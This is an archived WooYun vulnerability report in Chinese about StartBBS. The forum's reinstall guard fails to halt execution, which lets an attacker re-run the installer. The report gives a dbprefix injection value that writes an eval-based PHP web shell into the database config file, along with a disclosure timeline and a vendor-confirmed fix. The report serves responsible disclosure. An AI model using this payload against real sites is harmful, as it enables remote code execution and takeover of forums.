@@ -1,0 +1,341 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		开源轻论坛StartBBS前台getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		开源轻论坛StartBBS前台getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/phith0n">phith0n</a> 
+</li><li>提交时间：		2013-12-09 12:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-12：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-29：	细节向普通白帽子公开<br/>
+									2014-01-18：	细节向实习白帽子公开<br/>
+									2014-03-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">直接写一句话getshell。<br />
+所有测试都是在本地进行的哦，我立志做一个好孩纸~！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">    心血来潮读读代码。StartBBS界面挺清爽的，体积也小。下载下来安装。<br />
+<br />
+　　安装好后发现根目录下多了一个install.lock，一般的cms为了防止被重安装就会在目录下生成一个类似的文件，下次有人再访问安装脚本的时候，脚本会检测，如果目录下有这个文件就提示“请删除后再安装”。<br />
+<br />
+　　原本应该是没有任何问题的。但我们来到安装脚本，/app/controllers/install.php中，查看它是怎么处理的：<br />
+<br />
+</p><pre><code>class Install extends Install_Controller<br />
+{<br />
+	function __construct ()<br />
+	{<br />
+		parent::__construct();<br />
+		$this-&gt;load-&gt;library(&#039;myclass&#039;);<br />
+		$file=FCPATH.&#039;install.lock&#039;;<br />
+		if (file_exists($file)){<br />
+			$this-&gt;myclass-&gt;notice(&#039;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&#039;.site_url().&#039;&quot;;&#039;);<br />
+		}<br />
+<br />
+	}</code></pre><p class='detail'><br />
+<br />
+　　看到这里我就笑了。构造函数里检查是否存在install.lock，然后用javascript的方式告诉用户“系统已安装过”，然后跳转。但是这个脚本根本还没有结束嘛，这个类里的函数都可以运行，并不因为返回了一个window.location.href就停止运行。（this-&gt;myclass-&gt;notice()中也没有停止运行的代码）<br />
+<br />
+　　然后，在往下翻，就能看到安装的函数：<br />
+<br />
+</p><pre><code>public function step($step)<br />
+	{<br />
+		$data[&#039;step&#039;]=$step;<br />
+		if($step==1 || $step==2){<br />
+			$data[&#039;permission&#039;] = $this-&gt;_checkFileRight();<br />
+			$this-&gt;load-&gt;view(&#039;install&#039;,$data);<br />
+		}<br />
+		if($step==3){<br />
+			$this-&gt;_install_do();<br />
+		}<br />
+	}<br />
+<br />
+	function _install_do()<br />
+	{<br />
+		$data[&#039;step&#039;]=3;<br />
+		if($_POST){	<br />
+				$dbhost = $this-&gt;input-&gt;post(&#039;dbhost&#039;);<br />
+				$dbport = $this-&gt;input-&gt;post(&#039;dbport&#039;);<br />
+				$dbname = $this-&gt;input-&gt;post(&#039;dbname&#039;);<br />
+				$dbuser = $this-&gt;input-&gt;post(&#039;dbuser&#039;);<br />
+				$dbpwd = $this-&gt;input-&gt;post(&#039;dbpwd&#039;)?$this-&gt;input-&gt;post(&#039;dbpwd&#039;):&#039;&#039;;<br />
+				$dbprefix = $this-&gt;input-&gt;post(&#039;dbprefix&#039;);<br />
+				$userid = $this-&gt;input-&gt;post(&#039;admin&#039;);<br />
+				$pwd = md5($this-&gt;input-&gt;post(&#039;pwd&#039;));<br />
+				$email = $this-&gt;input-&gt;post(&#039;email&#039;);<br />
+				$sub_folder = &#039;/&#039;.$this-&gt;input-&gt;post(&#039;base_url&#039;).&#039;/&#039;;<br />
+				$conn = mysql_connect($dbhost.&#039;:&#039;.$dbport,$dbuser,$dbpwd);<br />
+				if (!$conn) {<br />
+					die(&#039;无法连接到数据库服务器，请检查用户名和密码是否正确&#039;);<br />
+				}<br />
+				if($this-&gt;input-&gt;post(&#039;creatdb&#039;)){<br />
+					if(!@mysql_query(&#039;CREATE DATABASE IF NOT EXISTS &#039;.$dbname)){<br />
+						die(&#039;指定的数据库(&#039;.$dbname.&#039;)系统尝试创建失败，请通过其他方式建立数据库&#039;);<br />
+					}<br />
+				}<br />
+				if(!mysql_select_db($dbname,$conn)){<br />
+					die($dbname.&#039;数据库不存在，请创建或检查数据名.&#039;);<br />
+<br />
+				}<br />
+					$sql = file_get_contents(FCPATH.&#039;app/config/startbbs.sql&#039;);<br />
+					$sql = str_replace(&quot;sb_&quot;,$dbprefix,$sql);<br />
+					$explode = explode(&quot;;&quot;,$sql);<br />
+					$data[&#039;msg1&#039;]=&quot;创建表&quot;.$dbname.&quot;成功，请稍后……&lt;br/&gt;&quot;;<br />
+				 	foreach ($explode as $key=&gt;$value){<br />
+				    	if(!empty($value)){<br />
+				    		if(trim($value)){<br />
+					    		mysql_query($value.&quot;;&quot;);<br />
+				    		}<br />
+				    	}<br />
+				  	}<br />
+					$password = $pwd;<br />
+				  	$ip=$this-&gt;myclass-&gt;get_ip();<br />
+				  	$insert= &quot;INSERT INTO &quot;.$dbprefix.&quot;users (group_type,gid,is_active,username,password,email,regtime,ip) VALUES (&#039;0&#039;,&#039;1&#039;,&#039;1&#039;,&#039;&quot;.$userid.&quot;&#039;,&#039;&quot;.$password.&quot;&#039;,&#039;&quot;.$email.&quot;&#039;,&#039;&quot;.time().&quot;&#039;,&#039;&quot;.$ip.&quot;&#039;)&quot;;<br />
+				  	mysql_query($insert);<br />
+					mysql_close($conn);<br />
+					$data[&#039;msg2&#039;]=&quot;安装完成，正在保存配置文件，请稍后……&quot;; <br />
+					$dbconfig = &quot;&lt;?php  if ( ! defined(&#039;BASEPATH&#039;)) exit(&#039;No direct script access allowed&#039;);\n&quot;<br />
+					.&quot;\$active_group = &#039;default&#039;;\n&quot;<br />
+					.&quot;\$active_record = TRUE;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;hostname&#039;] = &#039;&quot;.$dbhost.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;port&#039;] = &#039;&quot;.$dbport.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;username&#039;] = &#039;&quot;.$dbuser.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;password&#039;] = &#039;&quot;.$dbpwd.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;database&#039;] = &#039;&quot;.$dbname.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;dbdriver&#039;] = &#039;mysql&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;dbprefix&#039;] = &#039;&quot;.$dbprefix.&quot;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;pconnect&#039;] = TRUE;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;db_debug&#039;] = TRUE;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;cache_on&#039;] = FALSE;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;cachedir&#039;] = &#039;app/cache&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;char_set&#039;] = &#039;utf8&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;dbcollat&#039;] = &#039;utf8_general_ci&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;swap_pre&#039;] = &#039;&#039;;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;autoinit&#039;] = TRUE;\n&quot;<br />
+					.&quot;\$db[&#039;default&#039;][&#039;stricton&#039;] = FALSE;&quot;;<br />
+					$file = FCPATH.&#039;/app/config/database.php&#039;;<br />
+					file_put_contents($file,$dbconfig);<br />
+			 <br />
+					//保存config文件<br />
+					if($sub_folder){<br />
+						$this-&gt;config-&gt;update(&#039;myconfig&#039;,&#039;sub_folder&#039;, $sub_folder);<br />
+					}<br />
+					$encryption_key = md5(uniqid());<br />
+					if($encryption_key){<br />
+						$this-&gt;config-&gt;update(&#039;myconfig&#039;,&#039;encryption_key&#039;, $encryption_key);<br />
+					}<br />
+<br />
+					$data[&#039;msg3&#039;]=&quot;保存配置文件完成！&quot;;<br />
+					touch(FCPATH.&#039;install.lock&#039;); <br />
+					$data[&#039;msg4&#039;]=&quot;创建锁定安装文件install.lock成功&quot;;<br />
+					$data[&#039;msg5&#039;]=&quot;安装startbbs成功！&quot;;<br />
+		}<br />
+		$this-&gt;load-&gt;view(&#039;install&#039;,$data);<br />
+<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+　　当step函数的参数为3时，就执行安装函数_install_do()，这个函数里初始化了数据库，并把数据库配置文件写入了“/app/config/database.php”。于是，我们可以构造一下数据包直接把一句话写入到这个配置文件里。<br />
+<br />
+　　我们看到，这个函数接收了许多post数据：<br />
+<br />
+　　$dbhost = $this-&gt;input-&gt;post(&#039;dbhost&#039;);<br />
+<br />
+　　$dbport = $this-&gt;input-&gt;post(&#039;dbport&#039;);<br />
+<br />
+　　$dbname = $this-&gt;input-&gt;post(&#039;dbname&#039;);<br />
+<br />
+　　$dbuser = $this-&gt;input-&gt;post(&#039;dbuser&#039;);<br />
+<br />
+　　$dbpwd = $this-&gt;input-&gt;post(&#039;dbpwd&#039;)?$this-&gt;input-&gt;post(&#039;dbpwd&#039;):&#039;&#039;;<br />
+<br />
+　　$dbprefix = $this-&gt;input-&gt;post(&#039;dbprefix&#039;);<br />
+<br />
+　　$userid = $this-&gt;input-&gt;post(&#039;admin&#039;);<br />
+<br />
+　　$pwd = md5($this-&gt;input-&gt;post(&#039;pwd&#039;));<br />
+<br />
+　　$email = $this-&gt;input-&gt;post(&#039;email&#039;);<br />
+<br />
+　　$sub_folder = &#039;/&#039;.$this-&gt;input-&gt;post(&#039;base_url&#039;).&#039;/&#039;;<br />
+<br />
+　　其中dbhost、dbport、dbname、dbuser、dbpwd都不能随便乱写，乱写的话安装就会出错，而userid、pwd、email、sub_folder都是写入数据库的，不写入配置文件。所以就剩下dbprefix了，所以我们可以这样构造这个字段：<br />
+<br />
+　　dbprefix=sb_&#039;;@eval ($_POST[101]);$xxx=&#039;<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">因为这个重安装漏洞破坏性太大，getshell以后网站等于重置了，所以我没有在网上测试。测试都在本地进行~<br />
+<br />
+<br />
+<br />
+首先在外面找一个可以外连的mysql账号，为的是让安装成功进行。<br />
+<br />
+我这里在我vps上新建了一个账号test_db_user，然后构造下面的这个数据包，发送：<br />
+<br />
+</p><p class="detail"><a href="../images/0616061141961e6606980141f0b96f383f37b678.jpg" target="_blank"><img src="../images/0616061141961e6606980141f0b96f383f37b678.jpg" alt="01.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+等待一会发现返回了安装成功提示。因为我在本地测试的，所以我来到网站目录下，/app/config/database.php<br />
+<br />
+</p><p class="detail"><a href="../images/06160641d600551c0c014317058be4c761df4bc4.jpg" target="_blank"><img src="../images/06160641d600551c0c014317058be4c761df4bc4.jpg" alt="02.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+可以看到，一句话已经写入了。菜刀连接index.php就可以了，直接连这个数据库配置文件是不行的。<br />
+<br />
+</p><p class="detail"><a href="../images/06160704d5e55b157372aaa59f8bd0ee69be7445.jpg" target="_blank"><img src="../images/06160704d5e55b157372aaa59f8bd0ee69be7445.jpg" alt="03.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"></p><pre><code>function __construct ()<br />
+	{<br />
+		parent::__construct();<br />
+		$this-&gt;load-&gt;library(&#039;myclass&#039;);<br />
+		$file=FCPATH.&#039;install.lock&#039;;<br />
+		if (file_exists($file)){<br />
+			$this-&gt;myclass-&gt;notice(&#039;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&#039;.site_url().&#039;&quot;;&#039;);<br />
+			exit;<br />
+		}<br />
+<br />
+	}</code></pre><p class='detail'> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/phith0n" title="phith0n">phith0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045143" title="开源轻论坛StartBBS前台getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-09 17:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢提供的测试，这个漏洞补上。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45143";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
